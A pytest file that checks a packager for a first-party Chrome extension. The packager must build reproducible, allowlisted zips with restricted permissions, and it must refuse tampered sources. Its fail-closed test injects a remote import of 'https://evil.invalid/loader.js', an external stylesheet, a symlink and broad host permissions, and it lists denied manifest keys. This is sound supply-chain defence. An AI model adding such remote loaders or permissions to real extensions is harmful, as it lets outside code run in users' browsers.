"""SP44: installable Chrome companion is built from reviewed first-party code.

No employer requests or browser privileges are executed by these tests.
"""
from __future__ import annotations

from hashlib import sha256
import importlib.util
import json
from pathlib import Path
import shutil
import subprocess
import sys
import zipfile

import pytest


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "web/scripts/package_companion.py"
SOURCE = ROOT / "browser-companion"


def load_packager():
    spec = importlib.util.spec_from_file_location("smartploy_companion_packager", SCRIPT)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_sp44_exact_source_allowlist_reproducible_zip_and_standalone_sha(tmp_path):
    packager = load_packager()
    first = tmp_path / "first" / "smartploy-apply-companion.zip"
    second = tmp_path / "other" / "smartploy-apply-companion.zip"
    a = packager.make_zip(first)
    b = packager.make_zip(second)
    assert a == b == sha256(first.read_bytes()).hexdigest()
    assert first.read_bytes() == second.read_bytes()  # stable across repeated builds
    assert first.with_name(first.name + ".sha256").read_text() == (
        f"{a}  smartploy-apply-companion.zip\n"
    )

    with zipfile.ZipFile(first) as zipfile_src:
        names = zipfile_src.namelist()
        expected = sorted((*packager.FILES, "INSTALL.txt", "SHA256SUMS.txt"))
        assert names == expected
        assert zipfile_src.testzip() is None
        assert all(
            x.date_time == packager.ZIP_TIMESTAMP and
            x.compress_type == zipfile.ZIP_STORED
            for x in zipfile_src.infolist()
        )
        assert names[0] != "browser-companion/manifest.json"
        for name in packager.FILES:
            assert zipfile_src.read(name) == (SOURCE / name).read_bytes()
        manifest = json.loads(zipfile_src.read("manifest.json"))
        assert manifest["manifest_version"] == 3
        assert manifest["permissions"] == ["activeTab", "scripting", "storage"]
        assert manifest["action"]["default_popup"] == "popup.html"
        for denied in (
            "host_permissions", "background", "content_scripts",
            "externally_connectable", "update_url",
        ):
            assert denied not in manifest
        sums = zipfile_src.read("SHA256SUMS.txt").decode().splitlines()
        assert sums == [
            f"{sha256((SOURCE / name).read_bytes()).hexdigest()}  {name}"
            for name in sorted(packager.FILES)
        ]
        guide = zipfile_src.read("INSTALL.txt").decode()
        assert "Load unpacked" in guide
        assert "No" not in guide[:1]  # guide must not be an error
        assert "NOT a Chrome Web Store install" in guide
        assert "not automatically update" in guide
        assert "Developer mode" in guide
        assert not any(
            "tests/" in name or ".." in name or name.endswith((".env", ".py", ".map"))
            for name in names
        )


def test_sp44_package_cli_produces_verified_output_without_network(tmp_path):
    target = tmp_path / "bundle.zip"
    result = subprocess.run(
        [sys.executable, str(SCRIPT), "--output", str(target)],
        check=True, capture_output=True, text=True, timeout=20,
    )
    assert "sha256=" in result.stdout
    assert target.stat().st_size > 50_000
    with zipfile.ZipFile(target) as bundle:
        assert "manifest.json" in bundle.namelist()


@pytest.mark.parametrize("violation", [
    "host_permission", "background", "remote_import", "missing_import",
    "symlink", "unapproved_popup_asset",
])
def test_sp44_distribution_fails_closed_on_unreviewed_extension_change(
    tmp_path, monkeypatch, violation,
):
    packager = load_packager()
    scratch = tmp_path / "companion"
    shutil.copytree(SOURCE, scratch)
    monkeypatch.setattr(packager, "SOURCE", scratch)

    manifest_path = scratch / "manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    if violation == "host_permission":
        manifest["host_permissions"] = ["<all_urls>"]
    elif violation == "background":
        manifest["background"] = {"service_worker": "worker.js"}
    elif violation == "remote_import":
        (scratch / "logic.mjs").write_text(
            (scratch / "logic.mjs").read_text() + '\nimport "https://evil.invalid/loader.js";\n',
            encoding="utf-8",
        )
    elif violation == "missing_import":
        (scratch / "logic.mjs").write_text(
            (scratch / "logic.mjs").read_text() + '\nimport "./new-unreviewed.js";\n',
            encoding="utf-8",
        )
    elif violation == "symlink":
        (scratch / "popup.css").unlink()
        (scratch / "popup.css").symlink_to(scratch / "logic.mjs")
    elif violation == "unapproved_popup_asset":
        (scratch / "popup.html").write_text(
            (scratch / "popup.html").read_text().replace(
                'href="popup.css"', 'href="https://evil.invalid/style.css"'
            ), encoding="utf-8",
        )
    if violation in ("host_permission", "background"):
        manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    with pytest.raises(ValueError):
        packager.make_zip(tmp_path / "should-not-exist.zip")
    assert not (tmp_path / "should-not-exist.zip").exists()


def test_sp44_web_build_contains_same_first_party_download_and_fail_closed_route():
    package = json.loads((ROOT / "web/package.json").read_text(encoding="utf-8"))
    assert package["scripts"]["prebuild"] == "python3 scripts/package_companion.py"
    assert package["scripts"]["predev"] == package["scripts"]["prebuild"]
    docker = (ROOT / "web/Dockerfile").read_text(encoding="utf-8")
    assert "COPY browser-companion/ /workspace/browser-companion/" in docker
    assert "RUN npm run build" in docker
    assert "COPY --from=build /workspace/web/dist /srv" in docker
    assert "COPY --from=build /workspace/browser-companion" not in docker
    caddy = (ROOT / "deploy/personal/web.Caddyfile").read_text(encoding="utf-8")
    assert "@companion path /smartploy-apply-companion.zip /smartploy-apply-companion.zip.sha256" in caddy
    assert 'header Cache-Control "no-store"' in caddy
    assert caddy.index("handle @companion") < caddy.index("try_files {path} /index.html")
    studio = (ROOT / "web/src/ApplicationStudio.tsx").read_text(encoding="utf-8")
    assert 'href="/smartploy-apply-companion.zip"' in studio
    assert 'download="smartploy-apply-companion.zip"' in studio
    assert "Load unpacked" in studio
